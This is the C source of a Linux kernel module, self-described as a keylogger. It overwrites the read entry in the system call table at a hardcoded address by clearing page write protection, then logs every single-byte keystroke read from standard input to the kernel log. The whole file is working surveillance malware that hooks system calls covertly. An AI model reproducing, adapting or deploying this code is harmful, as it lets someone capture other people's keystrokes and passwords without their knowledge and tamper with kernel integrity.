#include <linux/module.h>
#include <linux/kernel.h>
#include <linux/init.h>
#include <linux/moduleparam.h>
#include <linux/unistd.h>
#include <linux/semaphore.h>
#include <asm/cacheflush.h>

MODULE_LICENSE("GPL");
MODULE_AUTHOR("Michal Malik");
MODULE_DESCRIPTION("Keylogger");

static void **sys_call_table;
/*
	grep sys_call_table /boot/System*
*/
static const unsigned long sys_call_addr = 0xc0493148;

asmlinkage int (*original_read)(int, char *, long);

asmlinkage long hook_read(int fd, char *buf, long count)
{
	long c = original_read(fd, buf, count);
	
	if(fd == 0 && count == 1)
		printk(KERN_INFO "[keylogger] 0x%02x", buf[0]);
	
	return c;
}

static int make_rw(unsigned long address)
{
	unsigned int level;
	pte_t *pte = lookup_address(address, &level);

	if(pte->pte & ~_PAGE_RW)
		pte->pte |= _PAGE_RW;

	return 0;
}

static int make_ro(unsigned long address)
{
	unsigned int level;
	pte_t *pte = lookup_address(address, &level);
	pte->pte = pte->pte & ~_PAGE_RW;

	return 0;
}

static int __init hook_init(void)
{
	sys_call_table = (void *)sys_call_addr;
	original_read = sys_call_table[__NR_read];
	make_rw((unsigned long)sys_call_table);
	sys_call_table[__NR_read] = hook_read;

	return 0;
}

static void __exit hook_cleanup(void)
{
	sys_call_table[__NR_read] = original_read;
	make_ro((unsigned long)(sys_call_table));
}

module_init(hook_init);
module_exit(hook_cleanup);